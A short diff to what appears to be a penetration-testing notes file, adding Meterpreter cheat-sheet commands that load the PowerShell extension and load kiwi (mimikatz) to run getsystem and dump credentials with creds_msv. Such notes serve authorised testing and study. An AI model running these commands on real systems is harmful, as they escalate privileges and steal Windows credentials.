@@ -50,3 +50,17 @@ Note that we are only able to migrate into a process executing at the same privi
 ps
 migrate pid
 ```
+###### Meterpreter command to use powershell
+```
+meterpreter > :
+load powershell
+help powershell
+powershell_execute "$PSVersionTable.PSVersion"
+```
+###### Meterpreter command to use mimikatz
+```
+meterpreter > :
+load kiwi
+getsystem
+creds_msv
+```
